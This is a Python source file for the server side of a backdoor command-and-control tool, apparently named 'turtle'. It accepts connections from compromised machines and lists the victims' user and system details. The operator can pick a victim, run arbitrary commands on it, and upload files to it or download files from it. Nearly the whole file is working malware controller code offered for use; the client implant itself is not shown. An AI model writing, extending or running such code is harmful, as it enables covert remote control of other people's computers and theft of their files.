import socket
import sys
from termcolor import colored , cprint
import time
from queue import Queue
import threading
import json
import base64
import re
import os
from prettytable import PrettyTable


NUMBER_OF_THREADS = 2
JOB_NUMBER = [1, 2]
queue = Queue()
all_connection = []
all_address = []
host = '127.0.0.1'
port = 5555
# ------------------------------------------------------------------------------

# Download File From Backdoor
def write_file( path, content):
    try:
        # desktop_path = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
        # file_path = os.path.join(desktop_path, "test.txt")
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] download successful"
    except Exception as ex:
        print(colored("Error from write_file", "red"))
        print(ex)

# Read file For Upload To Backdoor
def read_file(path):
    path = os.path.normpath(path)
    with open(path, "rb") as file:
        return base64.b64encode(file.read())
    
    
# Send Data
def reliable_send( data, s):
    json_data = json.dumps(data)
    s.send(json_data.encode())

# Receive Data
def reliable_receive(s):
    json_data = ""
    while True:
        try:
            json_data += s.recv(1024).decode()
            return json.loads(json_data)
        except ValueError as e:
            # print(colored("Error form reliable_receive ", "red"))
            # print(e)
            continue

# ------------------------------------------------------------------------------
def socket_create():
    try:
        global s
        s = socket.socket()
    except socket.error as msg:
        print(colored("Error from socket_create", "yellow"))
        print("Socket creation error: " + msg)


def socket_bind():
    try:
        global s
        # print(colored("Binding socket to port " + str(port), 'yellow'))
        s.bind((host, port))
        s.listen(5)
    except socket.error as msg:
        print("Socket bind error" + str(msg))
        time.sleep(5)
        socket_bind()


def accept_connection():
    for c in all_connection:
        c.close()
    del all_connection[:]
    del all_address[:]

    while True:
        try:
            conn, address = s.accept()
            conn.setblocking(1)
            all_connection.append(conn)
            all_address.append(address)
            print(colored(f"\n[+] Connection has been establish | IP {address[0]}", "green"))
            print(colored("turtle> ", "blue"),end="")

        except:
            print(colored("Error accepting connections", "red"))

# Interacting prompt for sending commands remotely


def start_turtle():
    while True:
        cmd = input(colored('turtle> ', "blue")).lower().split()
        if not cmd:
            continue
        if cmd[0] == 'list':
            
            list_connection()
            # continue
        elif cmd[0]=='select' :
            conn = get_target(cmd[1])
            if conn is not None:
                send_target_commands(conn)
        else:
            print("Command not recognized")


# Display all current connections

def list_connection():
    # results = ""
    results = []
    pretty_results = PrettyTable()
    for i, conn in enumerate(all_connection):
        try:
            # conn.send(" ".encode())
            reliable_send(s=conn, data= ['whoami'])
            # conn.recv(20480)
            sys_info = reliable_receive(s=conn)
            
        except Exception as ex:
            del all_connection[i]
            del all_address[i]
            print(colored("Error from list connection","red"))
            print(colored("ex","yellow"))
            continue
        results.append ([str(i) ,str(all_address[i][0]) , str(all_address[i][1])] + sys_info)
        
        
    pretty_results.field_names = ["Index", "IP Address", "Port", "User", "System", "Version"]
    for arr in results:
        pretty_results.add_row(arr)
    print('------Clients-----' + '\n' , pretty_results)


# select a target client
def get_target(target):
    try:
        target = int(target) 
        conn = all_connection[target]
        user_connect = str(all_address[target][0])
        print(colored(f"You are now connected to {user_connect}" , "green"))
        print(colored("turtle> ","blue"), end="")
        return conn
    except Exception as e:
        print(colored("Not a valid selection", "red"))
        print(e)
        return None


def execute_command(conn, data):
    try:
        reliable_send(s=conn, data=data)
        client_response = reliable_receive(s=conn)
        # print(client_response, end="")
        return client_response
    except Exception as ex:
        print(colored("Error from execute_command function", "red"))
        print(colored(ex, "yellow"))

# remove extra space
def factory_input(input_string):
    if "\"" not in input_string:
        return input_string.split()
    else:
        result_list = re.findall(r'[^"\s]+|"(?:\\.|[^"])*"', input_string)
        result_list = [item.replace('"', '').strip() for item in result_list]
        return result_list

# connect with remote target client
def send_target_commands(conn):
    location = ""
    while True:
        try:
        
            command = factory_input(input())
            if not command :
                cprint(location, "red", attrs=["bold"], end="")
                continue
            
            command_user = command[0].lower()
            
            if command_user in ["help", "h"]:
                show_list_command()
                print(location, end="")
                continue
            
            if command_user in ['quit', 'exit']: 
                break
            if command_user == "upload":
                file_content = read_file(command[1])
                command.append(file_content.decode())
            
            result_from_client = execute_command(conn=conn, data=command)
            if command_user == "whoami":
                print(result_from_client)
                cprint(location, "red", attrs=["bold"], end="")
                continue
                
            
            if command_user == "download":
                file_path = command[2]
                file_name = os.path.basename(command[1])
                file_path = os.path.join(file_path, file_name)
                
                result_from_client =[ write_file(path=file_path, content= result_from_client[0]), result_from_client[1] ]
            
        except Exception as ex:
            print(colored("Connection was lost", "red"))
            print(colored(f"ERROR:\n {ex}" , "yellow"))
            break
        print(result_from_client[0])
        # print(result_from_client[1], end="")
        cprint(result_from_client[1], "red", attrs=["bold"], end="")
        location = result_from_client[1]

# Help
def show_list_command():
    table = PrettyTable()

    table.field_names = ["Command", "Description", "Example"]
    table.add_row(["help/h", "Show list of commands", "help/h"])
    table.add_row(["upload", "Send file for target PC", "upload [data.txt] [path_on_target_pc]"])
    table.add_row(["download", "Get file from target PC", "download [data.txt] [path_on_your_pc]"])

    table.align["Command"] = "l"
    table.align["Description"] = "l"
    table.align["Example"] = "l"
    print(table)
    
# Create worker threads
def create_worker():
    for _ in range(NUMBER_OF_THREADS):
        t = threading.Thread(target=work)
        t.daemon = True
        t.start()

# Do the next job in queue (one handle connection , second send commands)


def work():
    while True:
        x = queue.get()
        if x == 1:
            socket_create()
            socket_bind()
            accept_connection()
        if x == 2:
            start_turtle()
        queue.task_done()

# Each list item is a new job
def create_job():
    for x in JOB_NUMBER:
        queue.put(x)
    queue.join()


create_worker()
create_job()
